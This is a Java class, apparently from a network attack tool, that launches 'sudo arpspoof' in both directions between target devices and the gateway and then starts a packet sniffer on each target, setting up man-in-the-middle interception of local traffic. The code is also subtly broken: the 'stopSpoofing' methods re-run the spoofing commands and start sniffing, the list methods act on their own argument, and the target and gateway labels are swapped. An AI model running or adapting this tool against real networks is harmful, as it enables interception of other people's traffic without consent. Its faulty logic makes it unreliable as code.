package org.npt.beans;

import org.npt.models.Device;

import java.util.ArrayList;
import java.util.List;
import static org.npt.configuration.Configuration.*;

public class ArpSpoofStarter {


    private static final String COMMAND = "sudo arpspoof -i %s -t %s %s";

    public void addDevices(List<Device> devices){
        devices.addAll(devices);
    }

    public void addDevice(Device device){
        devices.add(device);
    }


    public void removeDevice(Device device){
        devices.remove(device);
    }

    public void removeDevices(List<Device> devices){
        devices.removeAll(devices);
    }

    public void startSpoofing(Device device){
        String commandFirst = String.format(COMMAND,scanInterface,device.getIpAddress(),gateway.getIpAddress());
        String commandSecond = String.format(COMMAND,scanInterface,gateway.getIpAddress(),device.getIpAddress());
        String processName = String.format("Target : %s , Gateway : %s",gateway.getIpAddress(),device.getIpAddress());
        ProcessExecuter.execute(processName,logStorageFolder, new String[]{commandFirst},false);
        ProcessExecuter.execute(processName + "Reverse",logStorageFolder, new String[]{commandSecond},false);
    }

    public void stopSpoofing(List<Device> devices){
        devices.forEach((Device device) -> {
            String commandFirst = String.format(COMMAND,scanInterface,device.getIpAddress(),gateway.getIpAddress());
            String commandSecond = String.format(COMMAND,scanInterface,gateway.getIpAddress(),device.getIpAddress());
            String processName = String.format("Target : %s , Gateway : %s",gateway.getIpAddress(),device.getIpAddress());
            ProcessExecuter.execute(processName,logStorageFolder, new String[]{commandFirst},false);
            ProcessExecuter.execute(processName + "Reverse",logStorageFolder, new String[]{commandSecond},false);
            PacketSniffer packetSniffer = new PacketSniffer(device.getIpAddress());
            packetSniffer.startSniffing();
        });
    }

    public void stopSpoofing(Device device){
            String commandFirst = String.format(COMMAND,scanInterface,device.getIpAddress(),gateway.getIpAddress());
            String commandSecond = String.format(COMMAND,scanInterface,gateway.getIpAddress(),device.getIpAddress());
            String processName = String.format("Target : %s , Gateway : %s",gateway.getIpAddress(),device.getIpAddress());
            ProcessExecuter.execute(processName,logStorageFolder, new String[]{commandFirst},false);
            ProcessExecuter.execute(processName + "Reverse",logStorageFolder, new String[]{commandSecond},false);
            PacketSniffer packetSniffer = new PacketSniffer(device.getIpAddress());
            packetSniffer.startSniffing();
    }

    public void startSpoofing(List<Device> devices){
        devices.forEach((Device device) -> {
            String commandFirst = String.format(COMMAND,scanInterface,device.getIpAddress(),gateway.getIpAddress());
            String commandSecond = String.format(COMMAND,scanInterface,gateway.getIpAddress(),device.getIpAddress());
            String processName = String.format("Target : %s , Gateway : %s",gateway.getIpAddress(),device.getIpAddress());
            ProcessExecuter.execute(processName,logStorageFolder, new String[]{commandFirst},false);
            ProcessExecuter.execute(processName + "Reverse",logStorageFolder, new String[]{commandSecond},false);
            PacketSniffer packetSniffer = new PacketSniffer(device.getIpAddress());
            packetSniffer.startSniffing();
        });
    }


}
